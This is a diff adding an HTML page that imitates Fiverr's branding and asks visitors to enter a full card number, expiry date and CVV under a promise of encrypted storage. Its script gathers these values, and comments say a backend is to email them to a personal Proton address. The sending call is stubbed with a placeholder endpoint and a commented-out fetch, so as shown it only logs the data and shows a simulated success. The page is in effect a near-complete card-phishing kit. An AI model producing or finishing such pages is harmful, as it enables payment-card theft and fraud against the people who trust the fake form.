@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Add Payment Method - Fiverr Style</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" xintegrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f0f2f5; /* Fiverr's light grey background */
+        }
+        .fiverr-green {
+            background-color: #1dbf73; /* Fiverr's primary green */
+        }
+        .fiverr-green-hover:hover {
+            background-color: #1aa765; /* Darker green on hover */
+        }
+        .fiverr-text-green {
+            color: #1dbf73;
+        }
+        .card-input-icon {
+            position: absolute;
+            top: 50%;
+            right: 1rem;
+            transform: translateY(-50%);
+            color: #9ca3af; /* gray-400 */
+        }
+        .tooltip {
+            position: relative;
+            display: inline-block;
+        }
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 180px;
+            background-color: #333; /* Darker tooltip */
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px 12px; /* Slightly more padding */
+            position: absolute;
+            z-index: 10;
+            bottom: 130%; /* Position the tooltip above */
+            left: 50%;
+            margin-left: -90px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.75rem; /* 12px */
+            line-height: 1.2;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        /* Input focus style to match Fiverr */
+        .form-input:focus {
+            border-color: #1dbf73;
+            box-shadow: 0 0 0 2px rgba(29, 191, 115, 0.3); /* Green glow */
+            outline: none;
+        }
+        /* Custom checkbox style */
+        .custom-checkbox {
+            appearance: none;
+            background-color: #fff;
+            border: 1px solid #d1d5db; /* gray-300 */
+            border-radius: 0.25rem; /* rounded-md */
+            width: 1.25rem; /* h-5 w-5 */
+            height: 1.25rem;
+            display: inline-block;
+            position: relative;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+        .custom-checkbox:checked {
+            background-color: #1dbf73; /* fiverr-green */
+            border-color: #1dbf73;
+        }
+        .custom-checkbox:checked::after {
+            content: '\f00c'; /* Font Awesome check icon */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            font-size: 0.8rem;
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        /* Message box styling */
+        #form-message-box {
+            padding: 0.75rem 1rem;
+            border-radius: 0.375rem; /* rounded-md */
+            font-size: 0.875rem; /* text-sm */
+            text-align: center;
+            margin-top: 1rem;
+            display: none; /* Hidden by default */
+        }
+        #form-message-box.success {
+            background-color: #d1fae5; /* green-100 */
+            color: #065f46; /* green-800 */
+            border: 1px solid #6ee7b7; /* green-300 */
+            display: block;
+        }
+        #form-message-box.error {
+            background-color: #fee2e2; /* red-100 */
+            color: #991b1b; /* red-800 */
+            border: 1px solid #fca5a5; /* red-300 */
+            display: block;
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="bg-white shadow-xl rounded-lg w-full max-w-lg overflow-hidden">
+        <div class="p-6 border-b border-slate-200">
+            <h1 class="text-xl font-semibold text-slate-800">Add Payment Method</h1>
+            <p class="text-sm text-slate-600 mt-1">Securely add your card details.</p>
+        </div>
+
+        <div class="p-6 md:p-8">
+            <form id="payment-form">
+                <div class="mb-5">
+                    <label for="cardholder-name" class="block text-sm font-medium text-slate-700 mb-1">Cardholder Name</label>
+                    <input type="text" id="cardholder-name" name="cardholder-name" placeholder="e.g. John Doe" class="form-input w-full px-4 py-2.5 border border-slate-300 rounded-md shadow-sm transition duration-150" required>
+                </div>
+
+                <div class="mb-5">
+                    <label for="card-number" class="block text-sm font-medium text-slate-700 mb-1">Card Number</label>
+                    <div class="relative">
+                        <input type="text" id="card-number" name="card-number" placeholder="0000 0000 0000 0000" class="form-input w-full px-4 py-2.5 border border-slate-300 rounded-md shadow-sm transition duration-150" required>
+                        <span id="card-type-icon" class="card-input-icon">
+                            <i class="far fa-credit-card text-slate-400"></i>
+                        </span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-4 mb-5">
+                    <div>
+                        <label for="expiry-date" class="block text-sm font-medium text-slate-700 mb-1">Expiry Date</label>
+                        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM / YY" class="form-input w-full px-4 py-2.5 border border-slate-300 rounded-md shadow-sm transition duration-150" required>
+                    </div>
+                    <div>
+                        <label for="cvv" class="block text-sm font-medium text-slate-700 mb-1">
+                            CVV / CVC
+                            <span class="tooltip text-slate-500 cursor-help ml-1">
+                                <i class="fas fa-question-circle fa-xs"></i>
+                                <span class="tooltiptext">The 3 or 4 digit code on the back (or front for Amex) of your card.</span>
+                            </span>
+                        </label>
+                        <input type="password" id="cvv" name="cvv" placeholder="123" class="form-input w-full px-4 py-2.5 border border-slate-300 rounded-md shadow-sm transition duration-150" required maxlength="4">
+                    </div>
+                </div>
+
+                <div class="mb-6">
+                    <label for="save-card" class="flex items-center cursor-pointer">
+                        <input type="checkbox" id="save-card" name="save-card" class="custom-checkbox">
+                        <span class="ml-2 text-sm text-slate-700">Save this card for future payments</span>
+                    </label>
+                </div>
+
+                <div class="flex items-center justify-center space-x-3 mb-6 opacity-75">
+                    <i class="fab fa-cc-visa fa-2x text-blue-700"></i>
+                    <i class="fab fa-cc-mastercard fa-2x text-red-600"></i>
+                    <i class="fab fa-cc-amex fa-2x text-blue-500"></i>
+                    <i class="fab fa-cc-discover fa-2x text-orange-500"></i>
+                    <i class="fab fa-cc-diners-club fa-2x text-sky-600"></i>
+                </div>
+
+                <button type="submit" id="add-card-button" class="w-full fiverr-green fiverr-green-hover text-white font-semibold py-3 px-4 rounded-md shadow-md transition duration-150 ease-in-out transform hover:scale-[1.02] focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50">
+                    <i class="fas fa-lock mr-2"></i> Add Card Securely
+                </button>
+
+                <div id="form-message-box"></div> <p class="text-xs text-slate-500 mt-5 text-center">
+                    <i class="fas fa-shield-alt mr-1 fiverr-text-green"></i> Your card details are encrypted and securely stored.
+                </p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // --- Client-Side JavaScript for UI Enhancements & Data Submission ---
+
+        const cardNumberInput = document.getElementById('card-number');
+        const expiryDateInput = document.getElementById('expiry-date');
+        const cvvInput = document.getElementById('cvv');
+        const paymentForm = document.getElementById('payment-form');
+        const addCardButton = document.getElementById('add-card-button');
+        const cardTypeIconElement = document.getElementById('card-type-icon').querySelector('i');
+        const formMessageBox = document.getElementById('form-message-box');
+
+        // 1. Card Number Formatting (add spaces) & Card Type Detection
+        cardNumberInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue.substring(0, 19); // Max 16 digits + 3 spaces
+
+            // Basic card type detection (visual only)
+            if (value.startsWith('4')) {
+                cardTypeIconElement.className = 'fab fa-cc-visa text-blue-700';
+                cvvInput.setAttribute('maxlength', '3');
+                cvvInput.setAttribute('placeholder', '123');
+            } else if (/^5[1-5]/.test(value)) {
+                cardTypeIconElement.className = 'fab fa-cc-mastercard text-red-600';
+                cvvInput.setAttribute('maxlength', '3');
+                cvvInput.setAttribute('placeholder', '123');
+            } else if (/^3[47]/.test(value)) {
+                cardTypeIconElement.className = 'fab fa-cc-amex text-blue-500';
+                cvvInput.setAttribute('maxlength', '4');
+                cvvInput.setAttribute('placeholder', '1234');
+            } else if (/^6(?:011|5)/.test(value)) {
+                cardTypeIconElement.className = 'fab fa-cc-discover text-orange-500';
+                cvvInput.setAttribute('maxlength', '3');
+                cvvInput.setAttribute('placeholder', '123');
+            } else if (/^3(?:0[0-5]|[68])/.test(value)) {
+                cardTypeIconElement.className = 'fab fa-cc-diners-club text-sky-600';
+                cvvInput.setAttribute('maxlength', '3');
+                cvvInput.setAttribute('placeholder', '123');
+            }
+            else {
+                cardTypeIconElement.className = 'far fa-credit-card text-slate-400'; // Default
+                cvvInput.setAttribute('maxlength', '4'); // Default to 4, can be 3 or 4
+                cvvInput.setAttribute('placeholder', '123');
+            }
+        });
+
+        // 2. Expiry Date Formatting (MM / YY)
+        expiryDateInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            let formattedValue = '';
+            if (value.length > 0) {
+                // Month: ensure it's between 01-12. Allow '0' or '1' as first digit.
+                let month = value.substring(0, 2);
+                if (month.length === 1 && month > '1') { // If first digit is 2-9, prepend 0
+                  month = '0' + month;
+                } else if (month.length === 2) {
+                  const monthInt = parseInt(month, 10);
+                  if (monthInt === 0) month = '01'; // Cannot be 00
+                  else if (monthInt > 12) month = '12'; // Cap at 12
+                }
+                formattedValue = month;
+
+                if (value.length >= 2) { // Add slash after month if year part starts or month is complete
+                    formattedValue += ' / ';
+                    if (value.length > 2) {
+                        formattedValue += value.substring(2, 4); // Add year (YY)
+                    }
+                }
+            }
+            e.target.value = formattedValue.substring(0, 7); // MM / YY is 7 chars
+        });
+
+        // 3. Form Submission
+        paymentForm.addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Show loading state and clear previous messages
+            addCardButton.disabled = true;
+            addCardButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Processing...';
+            formMessageBox.style.display = 'none';
+            formMessageBox.className = ''; // Reset classes
+
+            // Collect form data
+            const formData = {
+                cardholderName: document.getElementById('cardholder-name').value,
+                cardNumber: cardNumberInput.value.replace(/\s/g, ''), // Send card number without spaces
+                expiryDate: expiryDateInput.value,
+                cvv: cvvInput.value,
+                saveCard: document.getElementById('save-card').checked,
+                timestamp: new Date().toISOString() // Optional: add a timestamp
+            };
+
+            // --- SIMULATION OF SENDING DATA TO BACKEND ---
+            // ** IMPORTANT: Replace 'YOUR_BACKEND_ENDPOINT_HERE' with your actual backend URL
+            // or the endpoint provided by a service like EmailJS or Formspree.
+            // This backend is responsible for sending the email to AndrewTate9023@proton.me
+            const backendUrl = 'YOUR_BACKEND_ENDPOINT_HERE'; // <<--- REPLACE THIS
+
+            console.log('Form Data to be sent:', formData);
+            console.log(`This data would be sent to a backend at ${backendUrl}, which would then email it to AndrewTate9023@proton.me`);
+
+            // Simulate network delay
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            // ** THIS IS A SIMULATION. In a real scenario, you'd use fetch:
+            /*
+            try {
+                const response = await fetch(backendUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        // Add any other headers like API keys if your backend requires them
+                    },
+                    body: JSON.stringify(formData)
+                });
+
+                addCardButton.disabled = false;
+                addCardButton.innerHTML = '<i class="fas fa-lock mr-2"></i> Add Card Securely';
+
+                if (response.ok) {
+                    const result = await response.json(); // Assuming backend sends JSON response
+                    formMessageBox.textContent = result.message || 'Card details processed successfully!';
+                    formMessageBox.className = 'success';
+                    paymentForm.reset(); // Optionally reset form
+                } else {
+                    const errorResult = await response.text(); // Or response.json() if backend sends JSON error
+                    formMessageBox.textContent = `Error: ${errorResult || response.statusText}`;
+                    formMessageBox.className = 'error';
+                }
+            } catch (error) {
+                addCardButton.disabled = false;
+                addCardButton.innerHTML = '<i class="fas fa-lock mr-2"></i> Add Card Securely';
+                formMessageBox.textContent = 'Network error or server unavailable. Please try again.';
+                formMessageBox.className = 'error';
+                console.error('Submission error:', error);
+            }
+            */
+
+            // For this demonstration, we'll just show a success message:
+            addCardButton.disabled = false;
+            addCardButton.innerHTML = '<i class="fas fa-lock mr-2"></i> Add Card Securely';
+            formMessageBox.textContent = 'Success! Card details captured (simulation). In a real app, this would be sent to your backend and then emailed.';
+            formMessageBox.className = 'success'; // Add 'success' class for styling
+            // paymentForm.reset(); // Uncomment to reset form after successful "submission"
+
+        });
+    </script>
+</body>
+</html>
